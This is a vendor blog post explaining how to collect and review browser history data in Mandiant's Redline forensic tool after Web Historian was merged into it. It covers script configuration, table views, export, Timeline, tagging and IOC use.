Blogs Get email updates as new blog posts are added."

                "text": "With the recent integration of Mandiant Web Historian™ into Mandiant Redline™ , you may be asking \"How do I review my Web History using Redline?\" If so, then follow along as I explain how to collect and review web history data in Redline - with a focus on areas where the workflow and features differ from that of Web Historian. For those of you unfamiliar with Redline, it is Mandiant's premier free tool, providing host investigative capabilities to help users find signs of malicious activity through memory and file analysis and the development of a threat assessment profile. Configuring Web History Data Collection Web Historian provided three options for choosing how to find web history data that you want to analyze: scan my local system, scan a profile folder, and parse an individual history file. Redline allows you to accomplish all three of these operations using a single option, Analyze this Computer , which is found under the Main Menu in the upper left corner. Specifying the path to a profile folder or a history file will require some additional configuration: Figure 1: Finding your web history data Web Historian (Left) vs. Redline (Right) Click on Analyze this Computer to begin configuring your analysis session. To ensure that Redline collects your desired web history data, click the link to Edit your script . On the View and Edit Your Script window are several options; take a look around and turn on any and all data that might interest you. For our purposes, we will be focusing on the Browser History options underneath the Network tab. This section contains all of the familiar options from Web Historian; simply select the boxes corresponding to the data you wish to collect. One difference you may notice is the absence of an option to specify the browser(s) you would like to target. You can now find that option by selecting Show Advanced Parameters from the upper right corner of the window. Once advanced parameters are enabled, simply type the name of any browser(s) you would like to target, each on its own separate line in the Target Browser field. To have Redline collect any web history data regardless of browser, just leave this field empty. You may also notice that enabling advanced parameters activates a field for History Files Location . As you may have guessed, this is where you can specify a path to a profile folder or history file to analyze directly, as you were able to do in Web Historian. Figure 2: Configuring Redline to Collect Browser History Data Now that you have finished configuring your script, choose a location to save your analysis session and then hit OK . Redline will run the script, which will require Administrator privileges and may trigger a UAC prompt before running depending on how your system is configured. After a brief collecting and processing time, your web history data will be ready for review. Reviewing your Data For the actual review of your web history data, you should feel right at home in Redline. Just like Web Historian, Redline uses a sortable, searchable, configurable table view for each of the individual categories of web history data. Figure 3: Displaying your web history data for review in both Web Historian (behind) and Redline (front) Although similar, Redline does have a few minor differences in how it visualizes your data: Redline does not break the data into pages; instead it will discretely page in large data sets (25k+ rows) automatically as you scroll down through the list. To configure the table view, you will need to manipulate the column headers for ordering and resizing, and right-click on a column header to show and hide columns - as opposed to using the column configuration menu in Web Historian. Searching and simple filtering is done in each individual table view and is not applied globally. To access the find options, either press the magnifying glass in the bottom right corner, or press Ctrl-f while a table view is selected. To export your data to a CSV (comma separated values) format file, click on export in the bottom right corner. Like Web Historian, Redline will only export data currently in the table view. If you applied any filtering or tags, those will affect the data as it is exported. In addition to the features that have always been available in Web Historian, Redline also allows you to review your web history with its full suite of analytical capabilities and investigative tools. Check out the Redline user guide for a full description of these capabilities. Here are just a few of the most popular: Timeline provides a chronological listing of all web-based events (e.g., URL last browsed to, File Download Started, etc.) in a single heterogeneous display. You can employ this to follow the activities of a user or attacker as they played out on the system. You can also quickly reduce your target investigative scope using the Timeline's powerful filtering capabilities. Use tags and comments to mark-up your findings as you perform your investigation, making it easier to keep track of what you have seen while moving forward. You can then go back and export those results into your favorite reporting solution. Use Indicators of Compromise (IOCs) as a quick way to determine if your system contains any potential security breaches or other evidence of compromise. Visit http://www.openioc.org/ to learn more about IOCs. Last but not least, Redline gives you the ability to examine an entire system worth of metadata. With Redline, you are not simply restricted to Web History related data; you can investigate security incidents with the scope and context of the full system. If your favorite feature from Web Historian has not yet been included in Redline (Graphing, Complex Filtering, etc.), feel free to make a request using one of the contact methods specified below. We will be taking feedback into consideration when choosing what the Redline team works on in the future. As always, feel free to contact us with send any additional questions. And just in case you do not already have it, the latest version of Redline (v1.10 as of the time of this writing) can always be found here .
